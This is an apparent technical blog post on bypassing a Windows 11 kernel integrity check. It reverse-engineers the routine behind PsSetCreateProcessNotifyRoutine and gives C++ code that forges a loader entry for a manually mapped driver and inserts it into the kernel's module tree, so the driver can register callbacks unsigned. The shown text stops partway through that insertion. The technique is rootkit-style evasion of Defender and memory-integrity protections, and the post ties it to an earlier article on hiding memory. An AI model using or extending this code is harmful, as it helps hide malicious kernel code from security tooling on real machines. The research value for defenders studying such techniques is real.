# https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/

█

[Skip to main content](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#__docusaurus_skipToContent_fallback)

On this page

When attempting to register a callback via `PsSetCreateProcessNotifyRoutine` from a manually mapped driver, the kernel will typically block the request and return `STATUS_ACCESS_DENIED`. This happens because the API internally calls `MmVerifyCallbackFunctionCheckFlags` to validate the caller. In this blog, we will explore how to bypass these checks and successfully register our unbacked driver.

C++

IDA Pro

WinDbg

## Setup [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#setup "Direct link to Setup")

Everything which we are going to talk about is done on latest Windows and defender versions, which at the time of writing this blog are -

#### Windows OS

- **Edition:** Windows 11 Pro
- **Version:**`25H2`
- **OS Build:**`26200.7840`

#### Defender Engine

- **Client:**`4.18.26010.5`
- **Engine:**`1.1.26010.1`
- **AV / AS:**`1.445.222.0`

#### Environment

Everything is created and built to test modern security with security features:

✓ Real-time protection

✓ Tamper Protection

✓ Memory integrity

✓ Memory access protection

✗ Microsoft Vulnerable Driver Blocklist

Warning

This is some serious work, hence should be used with care and made just for education and research purposes.

## Registering in `PsSetCreateProcessNotifyRoutine` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#registering-in-pssetcreateprocessnotifyroutine "Direct link to registering-in-pssetcreateprocessnotifyroutine")

In modern versions of Windows, Microsoft restricts sensitive kernel APIs like `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, `ObRegisterCallbacks`, etc. To use these APIs, the driver must not only be digitally signed, but it must also pass some more checks. There can be many reasons someone would need to register to these routines. In my case, it's needed to intercept the host process when it exits and re-attach the `VAD` entries which were removed in [VAD Unlinking](https://arth.imbeddex.com/Kernel_stuff/Windows/VAD-Unlinking) blog, because if we dont the memory manager crashes due to a VAD-PTE mismatch.

Trying to register our manually mapped driver as is in `PsSetCreateProcessNotifyRoutine` results in:

![STATUS_ACCESS_DENIED](https://arth.imbeddex.com/img/Kernel%20Callback%20Integrity%20Bypass/STATUS_ACCESS_DENIED.png)

Kernel Rejecting the Manually Mapped Driver

As you can see we got a error code `0xC0000022` which is `STATUS_ACCESS_DENIED`; you can find these codes [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55) EXTERNAL LINK TOhttps://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55![Website Preview](https://api.microlink.io/?url=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fopenspecs%2Fwindows_protocols%2Fms-erref%2F596a1078-e883-4972-9bbc-49e60bebca55&embed=image.url). We can trace this `0xC0000022` inside ida and we see the function the OS calls to perform additional checks:

PspSetCreateProcessNotifyRoutine Pseudocode

```cpp
  if ( (a2 & 2) != 0 )
    v10 = 0x20LL;
  else
    v10 = 0LL;
  if ( !(unsigned int)MmVerifyCallbackFunctionCheckFlags(a1, v10) )
    return 0xC0000022LL;
```

We can see here, the OS calls `MmVerifyCallbackFunctionCheckFlags` and passes it our NotifyRoutine as `a1` and `v10` being just a way to check if the caller is registering an Extended callback.

>\_v10 Verification

We can verify this by looking at how `PspSetCreateProcessNotifyRoutineEx` works:

PspSetCreateProcessNotifyRoutineEx Pseudocode

```cpp
NTSTATUS __stdcall PsSetCreateProcessNotifyRoutineEx(PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, BOOLEAN Remove)
{
  // By adding 2, the function forces the bit to be turned on
  return PspSetCreateProcessNotifyRoutine(NotifyRoutine, (unsigned int)(Remove != 0) + 2);
}
```

Scenario A: ADD Callback

If a developer wants to ADD an Extended callback, they pass `Remove = 0`.

1\. (0 != 0) evaluates to 0

2\. 0 + 2 equals 2

BINARY RESULT0000 0010

- "Remove" bit (1st): **OFF**
- "Extended" bit (2nd): **ON**

Scenario B: REMOVE Callback

If a developer wants to REMOVE an Extended callback, they pass `Remove = TRUE (1)`.

1\. (1 != 0) evaluates to 1

2\. 1 + 2 equals 3

BINARY RESULT0000 0011

- "Remove" bit (1st): **ON**
- "Extended" bit (2nd): **ON**

We now know which function is responsible for the `EXCEPTION_ACCESS_VIOLATION`, Let's find out why.

## Reversing `MmVerifyCallbackFunctionCheckFlags` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#reversing-mmverifycallbackfunctioncheckflags "Direct link to reversing-mmverifycallbackfunctioncheckflags")

MmVerifyCallbackFunctionCheckFlags PseudoCode

```cpp
__int64 __fastcall MmVerifyCallbackFunctionCheckFlags(__int64 a1, int a2)
{
  unsigned int v3; // ebx
  __int64 v4; // rax

  v3 = 0;
  v4 = MiLockLoadedDataTableEntry(a1, 1);
  if ( v4 )
  {
    if ( !a2 || (a2 & *(_DWORD *)(v4 + 0x68)) != 0 )
      v3 = 1;
    MiUnlockLoadedDataTableEntry(v4, 1LL);
  }
  return v3;
}
```

The entire validation logic revolves around this single `if` statement. Let's deconstruct exactly how the Windows Kernel evaluates this line:

if (
!a2\|\|(a2&\*(\_DWORD\*)(v4 \+ 0x68))!=0
)

!a2

**Ex** call unused, so `a2` is `0`. The `!` flips it to **true**. Because this is an OR (`||`), the CPU **short-circuits** and passes the check immediately!

v4 \+ 0x68

_If using the `Ex` variant:_ The CPU evaluates the right side, jumping exactly `0x68` bytes forward from the returned structure's base memory address (`v4`).

\*(\_DWORD\*)

Tells the compiler to treat the memory at that `0x68` offset as a 32-bit integer (`DWORD`), which reads the target module's flags.

a2& ... !=0

**The Final Check:** A bitwise `AND` compares requested flags against the driver's flags. Non-zero means at least one requested flag is actively ON.

Since we are adding a callback routine and not doing it via the `Ex` variant, `MmVerifyCallbackFunctionCheckFlags` receives our `NotifyRoutine` in `a1` and 0 for `a2`. This makes the check a lil easier for us as `!a2` evaluates to `true`, passing this check. But this is only possible if `MiLockLoadedDataTableEntry` returns a valid pointer. Let's dive deeper.

## Reversing `MiLockLoadedDataTableEntry` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#reversing-milockloadeddatatableentry "Direct link to reversing-milockloadeddatatableentry")

Just like the previous function it's not complex, we can see tt's entire job is to take a raw memory address (our `NotifyRoutine`), figure out which driver it belongs to, and lock that driver's data structure so it can't be unloaded while the OS is looking at it.

MiLockLoadedDataTableEntry PseudoCode

```cpp
__int64 __fastcall MiLockLoadedDataTableEntry(__int64 a1, int a2)
{
  __int64 DataTableEntryByAddress; // rax
  __int64 v5; // r11
  __int64 v6; // rbx

  MiAcquireLoadLock(0LL);
  DataTableEntryByAddress = MmFindDataTableEntryByAddress(a1);
  v6 = DataTableEntryByAddress;
  if ( DataTableEntryByAddress )
  {
    MiLockLoaderEntry(DataTableEntryByAddress, a2 == 0 ? 2 : 0);
    return v6;
  }
  else
  {
    MmReleaseLoadLockShared(v5);
    return 0LL;
  }
}
```

Let's analyze the `MiLockLoadedDataTableEntry` function. Based on the previous call, we know it receives our `NotifyRoutine` in `a1`, and passes `1` as `a2`. Let's follow the "Success Path".

Execution Path Tracea1 = NotifyRoutine, a2 = 1

MiAcquireLoadLock(0LL);

Locks the global Loader list to prevent races.

v6 = MmFindDataTableEntryByAddress(a1);

Locates the driver struct using our NotifyRoutine address.

if ( DataTableEntryByAddress )

TRUE (Module was found)

↓

Target if Block Reached

MiLockLoaderEntry(DataTableEntryByAddress, a2==0?2:0);

returnv6;

**The Ternary Math:** Because `a2 = 1`, the condition `(1 == 0)` is False. Therefore, the ternary operator selects the second option, passing `0` into the lock function. It finally returns `v6`.

This function exposes another function `MmFindDataTableEntryByAddress` which is responsible for finding the driver given the `NotifyRoutine`, and if it fails everything crumbles and leads to the `STATUS_ACCESS_DENIED`. So, crafting a payload which will not make this function fail is very important. Opening up `MmFindDataTableEntryByAddress` will reveal where the OS keeps track of the drivers, which trees does it use, etc.

## Reversing `MmFindDataTableEntryByAddress` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#reversing-mmfinddatatableentrybyaddress "Direct link to reversing-mmfinddatatableentrybyaddress")

MmFindDataTableEntryByAddress Pseudocode

```cpp
_QWORD *__fastcall MmFindDataTableEntryByAddress(unsigned __int64 a1)
{
  v2 = (_QWORD *)MmLoadedModuleTree;
  while ( v2 )
  {
    v3 = *(v2 - 20);
    if ( a1 > v3 + (unsigned int)(*((_DWORD *)v2 - 36) - 1) )
    {
      v2 = (_QWORD *)v2[1];
    }
    else
    {
      if ( a1 >= v3 )
        break;
      v2 = (_QWORD *)*v2;
    }
  }
  if ( !v2 )
    return 0LL;
  return v2 - 26;
}
```

This code looks like it traverses `MmLoadedModuleTree` tree, and it's exactly that. If the Windows kernel used a standard list to look up memory addresses every time a callback fired or a process started, the operating system would become very laggy. Linear searches `O(n)` are too slow. To fix this, the Memory Manager organizes all loaded drivers into a binary search tree specifically, a [Red-Black](https://www.geeksforgeeks.org/dsa/introduction-to-red-black-tree/) EXTERNAL LINK TOhttps://www.geeksforgeeks.org/dsa/introduction-to-red-black-tree/![Website Preview](https://api.microlink.io/?url=https%3A%2F%2Fwww.geeksforgeeks.org%2Fdsa%2Fintroduction-to-red-black-tree%2F&embed=image.url) tree. This allows the kernel to perform quick `O(log n)` lookups to instantly see if a memory address belongs to a loaded driver.

### The Node [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#the-node "Direct link to The Node")

We know that the OS uses `MmLoadedModuleTree` to keep track of drivers, and it will be the tree in we will have to insert our drive. But, we will need to figure out what structure is the OS using, what does the actual nodes look like. For that lets look at the disassembly of the function.

Expand to view the complete `MmFindDataTableEntryByAddress` function

MmFindDataTableEntryByAddress (Assembly)

```nasm
.text:000000014036E0D0
.text:000000014036E0D0 ; _QWORD *__fastcall MmFindDataTableEntryByAddress(unsigned __int64)
.text:000000014036E0D0 MmFindDataTableEntryByAddress proc near ; CODE XREF: RtlPcToFileName+20↑p
.text:000000014036E0D0                                         ; MiIsDriverPage+38↑p ...
.text:000000014036E0D0
.text:000000014036E0D0 ; FUNCTION CHUNK AT .text:00000001406D0E6C SIZE 00000008 BYTES
.text:000000014036E0D0
.text:000000014036E0D0                 sub     rsp, 28h
.text:000000014036E0D4                 cmp     qword ptr cs:PsLoadedModuleList, 0
.text:000000014036E0DC                 mov     r9, rcx
.text:000000014036E0DF                 jz      short loc_14036E12A
.text:000000014036E0E1                 mov     rdx, cs:MmLoadedModuleTree
.text:000000014036E0E8                 jmp     short loc_14036E109
.text:000000014036E0EA ; ---------------------------------------------------------------------------
.text:000000014036E0EA
.text:000000014036E0EA loc_14036E0EA:                          ; CODE XREF: MmFindDataTableEntryByAddress+3C↓j
.text:000000014036E0EA                 mov     ecx, [rdx-90h]
.text:000000014036E0F0                 mov     r8, [rdx-0A0h]
.text:000000014036E0F7                 dec     ecx
.text:000000014036E0F9                 add     rcx, r8
.text:000000014036E0FC                 cmp     r9, rcx
.text:000000014036E0FF                 ja      short loc_14036E11B
.text:000000014036E101                 cmp     r9, r8
.text:000000014036E104                 jnb     short loc_14036E10E
.text:000000014036E106                 mov     rdx, [rdx]
.text:000000014036E109
.text:000000014036E109 loc_14036E109:                          ; CODE XREF: MmFindDataTableEntryByAddress+18↑j
.text:000000014036E109                                         ; MmFindDataTableEntryByAddress+4F↓j
.text:000000014036E109                 test    rdx, rdx
.text:000000014036E10C                 jnz     short loc_14036E0EA
.text:000000014036E10E
.text:000000014036E10E loc_14036E10E:                          ; CODE XREF: MmFindDataTableEntryByAddress+34↑j
.text:000000014036E10E                 test    rdx, rdx
.text:000000014036E111                 jnz     short loc_14036E121
.text:000000014036E113
.text:000000014036E113 loc_14036E113:                          ; CODE XREF: MmFindDataTableEntryByAddress+6B↓j
.text:000000014036E113                 xor     eax, eax
.text:000000014036E115
.text:000000014036E115 loc_14036E115:                          ; CODE XREF: MmFindDataTableEntryByAddress+58↓j
.text:000000014036E115                                         ; MmFindDataTableEntryByAddress+362D9F↓j
.text:000000014036E115                 add     rsp, 28h
.text:000000014036E119                 retn
.text:000000014036E119 ; ---------------------------------------------------------------------------
.text:000000014036E11A                 db 0CCh
.text:000000014036E11B ; ---------------------------------------------------------------------------
.text:000000014036E11B
.text:000000014036E11B loc_14036E11B:                          ; CODE XREF: MmFindDataTableEntryByAddress+2F↑j
.text:000000014036E11B                 mov     rdx, [rdx+8]
.text:000000014036E11F                 jmp     short loc_14036E109
.text:000000014036E121 ; ---------------------------------------------------------------------------
.text:000000014036E121
.text:000000014036E121 loc_14036E121:                          ; CODE XREF: MmFindDataTableEntryByAddress+41↑j
.text:000000014036E121                 lea     rax, [rdx-0D0h]
.text:000000014036E128                 jmp     short loc_14036E115
.text:000000014036E12A ; ---------------------------------------------------------------------------
.text:000000014036E12A
.text:000000014036E12A loc_14036E12A:                          ; CODE XREF: MmFindDataTableEntryByAddress+F↑j
.text:000000014036E12A                 mov     r10, qword ptr cs:KeNumberProcessorsGroup0+1
.text:000000014036E131                 add     r10, 10h
.text:000000014036E135                 mov     r8, [r10]
.text:000000014036E138
.text:000000014036E138 loc_14036E138:                          ; CODE XREF: MmFindDataTableEntryByAddress+83↓j
.text:000000014036E138                 cmp     r8, r10
.text:000000014036E13B                 jz      short loc_14036E113
.text:000000014036E13D                 mov     rdx, r9
.text:000000014036E140                 mov     rcx, r8
.text:000000014036E143                 call    MiImageContainsVa
.text:000000014036E148                 test    eax, eax
.text:000000014036E14A                 jnz     loc_1406D0E6C
.text:000000014036E150                 mov     r8, [r8]
.text:000000014036E153                 jmp     short loc_14036E138
.text:000000014036E153 MmFindDataTableEntryByAddress endp
```

### The -ve Offsets [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#the--ve-offsets "Direct link to The -ve Offsets")

In the disassembly we can see the compiler using a few -ve offsets:

```nasm
.text:000000014036E0EA                 mov     ecx, [rdx-90h]
.text:000000014036E0F0                 mov     r8, [rdx-0A0h]
```

If `rdx` was pointing to the top of a standard structure, looking backwards would mean reading random, out-of-bounds memory. Therefore, `rdx` cannot be at the start of the structure.

This perfectly aligns with how Windows designs its internal tracking systems. Windows heavily relies on intrusive data structures, specifically the `_RTL_BALANCED_NODE`, to link items in a Red-Black tree. Instead of a tree node pointing to the data, the node is physically embedded right in the middle of the data. `rdx` is currently pointing at that embedded node.

struct\_RTL\_BALANCED\_NODE

\_RTL\_BALANCED\_NODE

```cpp
//0x18 bytes (sizeof)
struct _RTL_BALANCED_NODE
{
    union
    {
        struct _RTL_BALANCED_NODE* Children[2];                             //0x0
        struct
        {
            struct _RTL_BALANCED_NODE* Left;                                //0x0
            struct _RTL_BALANCED_NODE* Right;                               //0x8
        };
    };
    union
    {
        struct
        {
            UCHAR Red:1;                                                    //0x10
            UCHAR Balance:2;                                                //0x10
        };
        ULONGLONG ParentValue;                                              //0x10
    };
};
```

We can further verify that it is a `_RTL_BALANCED_NODE`. In a binary search tree, we only have two choices: go Left, or go Right. Let's look at the assembly when the code needs to move to the next item:

```nasm
.text:000000014036E106                 mov     rdx, [rdx]          ; Go Left

.text:000000014036E11B loc_14036E11B:
.text:000000014036E11B                 mov     rdx, [rdx+8]        ; Go Right
```

In assembly, `[rdx]` is shorthand for `[rdx+0]`. It reads a pointer directly from offset `0x0` and to go right it reads form offset `0x8`, The match is perfect. Offset `0x0` is the Left child pointer, and offset `0x8` is the Right child pointer. We have definitively proven that our `rdx` pointer is an embedded `_RTL_BALANCED_NODE`.

### Top of the Structure [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#top-of-the-structure "Direct link to Top of the Structure")

If `rdx` is in the middle of the structure, we need to find the top. The assembly shows us exactly that:

```nasm
.text:000000014036E121                 lea     rax, [rdx-0D0h]
.text:000000014036E128                 jmp     short loc_14036E115  ; (Returns rax)
```

When the kernel wants to return the actual driver entry to the calling function, it takes our node pointer `rdx` and subtracts exactly `0xD0`. It proves beyond a shadow of a doubt that the start of our mystery structure is `0xD0` bytes above the `_RTL_BALANCED_NODE`.

To visualize what we have deduced so far, here is a memory map of our mystery structure. Because Windows heavily relies on **Intrusive Data Structures**, the `_RTL_BALANCED_NODE` is not a separate object pointing to data; it is physically embedded exactly `0xD0` bytes deep inside the data itself. So rn, we can make a rough structure of the "structure":

\_ASSUMED\_AVL\_ENTRY\_STRUCTURE

0x00

⋮

( 0x30 bytes of unknown data )

0x30

ULONGLONGUnknownField1;// r8, \[rdx-0A0h\]

0x40

DWORDUnknownField2;// ecx,\[rdx-90h\]

⋮

( More unknown data... )

0xD0

0xE8

struct \_RTL\_BALANCED\_NODE <\-\- rdx pointer

\_RTL\_BALANCED\_NODE\\* Left;// +0x0

\_RTL\_BALANCED\_NODE\\* Right;// +0x8

ULONGLONGParentValue;// +0x10

⋮

( Unknown end of structure... )

### The Unknown Variables [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#the-unknown-variables "Direct link to The Unknown Variables")

Now that we know we are traversing a binary search tree, we need to figure out what data the tree is actually sorting. Earlier, we saw the code read two variables from negative offsets relative to our node:

- `r8` was read from `[rdx - 0A0h]`
- `ecx` was read from `[rdx - 90h]`

To figure out what these are, we just need to look at the math the assembly performs using our target address `r9`.

```nasm
.text:000000014036E0F7                 dec     ecx
.text:000000014036E0F9                 add     rcx, r8
.text:000000014036E0FC                 cmp     r9, rcx
.text:000000014036E0FF                 ja      short loc_14036E11B
.text:000000014036E101                 cmp     r9, r8
.text:000000014036E104                 jnb     short loc_14036E10E
.text:000000014036E106                 mov     rdx, [rdx]
```

Let's break down that logic. The code creates a boundary by adding `r8` and `ecx - 1`. If our target address is higher than that boundary, we search the right side of the tree. If our target address is lower than `r8`, we search the left side of the tree. In the context of searching memory, there is only one concept that fits this mathematical behavior: **Base Address + (Size - 1) = End Boundary**.

Now with confidence, we can say that:

r8

Base Address

ecx

Size (in BYTES)

We can now start drawing some connections,

- `r8` is `Base Address` which is at an offset of `0x30` bytes from the top of the assumed structure.
- `ecx` is `Size` which is at an offset of `0x40` bytes from the top of the assumed structure.

We know a Windows kernel structure which looks like that, its `_KLDR_DATA_TABLE_ENTRY`.

struct\_KLDR\_DATA\_TABLE\_ENTRY

\_KLDR\_DATA\_TABLE\_ENTRY

```cpp
//0xa0 bytes (sizeof)
struct _KLDR_DATA_TABLE_ENTRY
{
    struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
    VOID* ExceptionTable;                                                   //0x10
    ULONG ExceptionTableSize;                                               //0x18
    VOID* GpValue;                                                          //0x20
    struct _NON_PAGED_DEBUG_INFO* NonPagedDebugInfo;                        //0x28
    VOID* DllBase;                                                          //0x30
    VOID* EntryPoint;                                                       //0x38
    ULONG SizeOfImage;                                                      //0x40
    struct _UNICODE_STRING FullDllName;                                     //0x48
    struct _UNICODE_STRING BaseDllName;                                     //0x58
    ULONG Flags;                                                            //0x68
    USHORT LoadCount;                                                       //0x6c
    union
    {
        USHORT SignatureLevel:4;                                            //0x6e
        USHORT SignatureType:3;                                             //0x6e
        USHORT Frozen:2;                                                    //0x6e
        USHORT HotPatch:1;                                                  //0x6e
        USHORT Unused:6;                                                    //0x6e
        USHORT EntireField;                                                 //0x6e
    } u1;                                                                   //0x6e
    VOID* SectionPointer;                                                   //0x70
    ULONG CheckSum;                                                         //0x78
    ULONG CoverageSectionSize;                                              //0x7c
    VOID* CoverageSection;                                                  //0x80
    VOID* LoadedImports;                                                    //0x88
    union
    {
        VOID* Spare;                                                        //0x90
        struct _KLDR_DATA_TABLE_ENTRY* NtDataTableEntry;                    //0x90
    };
    ULONG SizeOfImageNotRounded;                                            //0x98
    ULONG TimeDateStamp;                                                    //0x9c
};
```

### `_ASSUMED_AVL_ENTRY_STRUCTURE` [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#_assumed_avl_entry_structure "Direct link to _assumed_avl_entry_structure")

Now we are able to make an educated guess how the structure in the memory looks like, we dont care about the rest of the bottom of the structure as we have covered all the fields the OS uses. So, putting everything together we get:

We now have all the pieces to solve the memory puzzle. We can now map the true structure exactly as the Windows Memory Manager sees it. By bridging the `0x30` byte gap of undocumented kernel data with standard padding, we align our embedded `_RTL_BALANCED_NODE` perfectly at offset `0xD0`. The final, usable structure is defined below:

\_ASSUMED\_AVL\_ENTRY\_STRUCTURE

0x00

0xA0

struct \_KLDR\_DATA\_TABLE\_ENTRY

... (Other Fields) ...

VOID\\* EntryPoint;// +0x38

ULONGSizeOfImage;// +0x40

... (Other Fields) ...

⋮

BYTE padding\[0x30\]; // 48 bytes (Win11)

0xD0

0xE8

struct \_RTL\_BALANCED\_NODE <\-\- rdx pointer

\_RTL\_BALANCED\_NODE\\* Left;// +0x0

\_RTL\_BALANCED\_NODE\\* Right;// +0x8

ULONGLONGParentValue;// +0x10

## Allocate buffer [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#allocate-buffer "Direct link to Allocate buffer")

Now, we can start to code. We will need to create the node first, for which we allocate memory:

Callback\_Integrity\_Bypass.cpp

```cpp
// Allocate a buffer for our _ASSUMED_AVL_ENTRY_STRUCTURE
g_pASSUMED_AVL_ENTRY_STRUCTURE = (PASSUMED_AVL_ENTRY_STRUCTURE)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(_ASSUMED_AVL_ENTRY_STRUCTURE), 'BESD');
if(!g_pASSUMED_AVL_ENTRY_STRUCTURE)
{
  LOG_W("[KCI_Bypas] [-] Failed to allocate memory for g_pASSUMED_AVL_ENTRY_STRUCTURE\n");
  return STATUS_INSUFFICIENT_RESOURCES;
}

// zero the allocated space
RtlZeroMemory(g_pASSUMED_AVL_ENTRY_STRUCTURE, sizeof(_ASSUMED_AVL_ENTRY_STRUCTURE));
```

Notice that we allocate this space in the non-paged pool (`POOL_FLAG_NON_PAGED`). This is crucial because we don't want the OS to page out this critical node while the kernel is operating on it. We're also passing a custom pool tag ('`BESD`') to `ExAllocatePool2`. Setting a unique 4 byte tag is standard practice in kernel development; it makes it much easier to track this specific allocation in memory during debugging or when hunting for memory leaks. Finally, zeroing out the allocated memory is always a good practice to prevent any garbage data from causing unpredictable behavior.

And in case if you are wondering, our reverse engineered structure `_ASSUMED_AVL_ENTRY_STRUCTURE`, looks like:

STRUCT\_ASSUMED\_AVL\_ENTRY\_STRUCTURE

```cpp
typedef struct _ASSUMED_AVL_ENTRY_STRUCTURE
{
	_KLDR_DATA_TABLE_ENTRY Kldr_data_table_entry;
	//BYTE padding[0x48];				// Win10
	BYTE padding[0x30];				// Win11
	_RTL_BALANCED_NODE Balanced_node;
} ASSUMED_AVL_ENTRY_STRUCTURE, *PASSUMED_AVL_ENTRY_STRUCTURE;
```

## Populate fields [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#populate-fields "Direct link to Populate fields")

Now that we have allocated and zeroed out the memory for our structure, all of its internal pointers are currently `nullptr` (or 0). If the OS attempts to read or traverse these uninitialized fields, it will result in an `BSOD` To prevent this, we need to start populating the fields with safe, valid values.

### Initialize linked list pointers [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#initialize-linked-list-pointers "Direct link to Initialize linked list pointers")

First, lets handle the linked list entries inside the `_KLDR_DATA_TABLE_ENTRY`

Callback\_Integrity\_Bypass.cpp

```cpp
InitializeListHead(&g_pASSUMED_AVL_ENTRY_STRUCTURE->Kldr_data_table_entry.InLoadOrderLinks);
```

In the Windows kernel, lists like `InLoadOrderLinks` are implemented as doubly linked lists using the `LIST_ENTRY` structure. By calling the `InitializeListHead` macro, we are setting both the forward link (`Flink`) and the backward link (`Blink`) of this entry to point to the entry itself. This effectively creates a valid, empty list. If the kernel's module tracking routines attempt to iterate through this specific list entry, they will immediately see that the list is empty and safely move on

### Populate core information [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#populate-core-information "Direct link to Populate core information")

Earlier, we observed that the undocumented kernel routine `MmFindDataTableEntryByAddress` relies on specific fields to locate a driver within the `MmLoadedModuleTree`. Because this tree is used by the OS to track all loaded kernel modules, correctly spoofing these fields is critical for our bypass.

Callback\_Integrity\_Bypass.cpp

```cpp
g_pASSUMED_AVL_ENTRY_STRUCTURE->Kldr_data_table_entry.DllBase = g_pDriverImageBase;
g_pASSUMED_AVL_ENTRY_STRUCTURE->Kldr_data_table_entry.SizeOfImage = g_OurImageSize;
```

To successfully fake our module's presence, we must accurately populate its memory bounds. The `DllBase` represents the starting virtual address of our driver in memory, and `SizeOfImage` defines its total memory footprint.

### Populate strings [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#populate-strings "Direct link to Populate strings")

Next, we need to populate the `FullDllName` and `BaseDllName` fields in our fake `_KLDR_DATA_TABLE_ENTRY`. These fields tell the OS the path and the name of our driver

Callback\_Integrity\_Bypass.cpp

```cpp
const WCHAR driverNameString[] = L"\\SystemRoot\\system32\\drivers\\baaaa_bae.sys";
const WCHAR baseNameString[] = L"baaaa_bae.sys";

SIZE_T fullDriverNameSize = sizeof(driverNameString);
g_pPersistentFullName = (PWCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, fullDriverNameSize, 'strF');
if(!g_pPersistentFullName) goto cleanup_ldr_entry;

RtlCopyMemory(g_pPersistentFullName, driverNameString, fullDriverNameSize);

baseDriverNameSize = sizeof(baseNameString);
g_pPersistentBaseName = (PWCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, baseDriverNameSize, 'strB');
if(!g_pPersistentBaseName) goto cleanup_fullname;

RtlCopyMemory(g_pPersistentBaseName, baseNameString, baseDriverNameSize);

RtlInitUnicodeString(&g_pASSUMED_AVL_ENTRY_STRUCTURE->Kldr_data_table_entry.FullDllName, g_pPersistentFullName);
RtlInitUnicodeString(&g_pASSUMED_AVL_ENTRY_STRUCTURE->Kldr_data_table_entry.BaseDllName, g_pPersistentBaseName);
```

You might be wondering: _"Why do we need to manually call `ExAllocatePool2` and copy the strings over?"_

THE UNICODE\_STRING TRAP

A `UNICODE_STRING` is not actually a string itself; it is simply a tracking structure. When we call `RtlInitUnicodeString`, it merely calculates the lengths and points the `Buffer` to the address we provide. **It does not copy the string data.**

UNICODE\_STRING

Length: 0x1E

MaximumLength: 0x20

Buffer --------→

NON\_PAGED\_POOL

L"baaaa\_bae.sys"

FATAL STACK CORRUPTION

If we were to pass a string that lives on the stack, that memory would be destroyed and overwritten as soon as our current function returns. Later, when a kernel routine inspects the module list and tries to read our driver's name, it would dereference a dangling pointer into garbage memory, resulting in an immediate `PAGE_FAULT_IN_NONPAGED_AREA` Blue Screen of Death!

### Initializing NodeModuleLink [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#initializing-nodemodulelink "Direct link to Initializing NodeModuleLink")

Next, we need to secure another critical linked list entry inside our fake module structure: the `NodeModuleLink`.

Callback\_Integrity\_Bypass.cpp

```cpp
g_pFake_LDR_DATA_TABLE_ENTRY->NodeModuleLink.Flink = &g_pFake_LDR_DATA_TABLE_ENTRY->NodeModuleLink;
g_pFake_LDR_DATA_TABLE_ENTRY->NodeModuleLink.Blink = &g_pFake_LDR_DATA_TABLE_ENTRY->NodeModuleLink;
```

If you recall from earlier, we used the `InitializeListHead` macro to safely initialize our `InLoadOrderLinks`. What we are doing here is the exact manual equivalent of that macro.

A `LIST_ENTRY` in the Windows kernel consists of two pointers: a `Flink` (Forward Link) and a `Blink` (Backward Link). When a doubly linked list is empty, it doesn't point to `nullptr`. Instead, it points back to its own memory address, creating a safely closed loop.

Memory State: Empty LIST\_ENTRY

▲

▲

&NodeModuleLink

Flink:&NodeModuleLink

Blink:&NodeModuleLink

### Insert node [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#insert-node "Direct link to Insert node")

With our fake `_KLDR_DATA_TABLE_ENTRY` fully populated and its linked lists safely self referenced, it is finally time to insert our node into the kernel's `MmLoadedModuleTree`.

Callback\_Integrity\_Bypass.cpp

```cpp
PRTL_BALANCED_NODE pNodeToInsert = &g_pASSUMED_AVL_ENTRY_STRUCTURE->Balanced_node;
pNodeToInsert->Left = NULL;
pNodeToInsert->Right = NULL;
pNodeToInsert->ParentValue = 0;

PRTL_BALANCED_NODE* ppRootNode = static_cast<PRTL_BALANCED_NODE*>(g_vpMmLoadedModuleTree);
PRTL_BALANCED_NODE pRootNode = *ppRootNode;

PRTL_BALANCED_NODE pParentNode = NULL;
BOOLEAN bInsertAsRight = FALSE;
```

First, we set up the node we intend to insert. Since it's a new addition, it starts its life as a leaf node at the bottom of the tree, meaning it has no children (Left and Right are NULL) and no parent yet. Before we even think about touching the global `MmLoadedModuleTree`, we must acquire its associated lock: `PsLoadedModuleResource`.

```cpp
ExAcquireResourceExclusiveLite(g_pPsLoadedModuleResource, TRUE);
```

The Windows kernel is highly asynchronous. At any given millisecond, another thread or process might be loading a legitimate driver, unloading a module, or querying the tree. If we try to modify the tree's pointers at the exact same time another thread is reading or writing to it, we will create a race condition. This leads to corrupted tree pointers, memory access violations, and an inevitable `BSOD`.

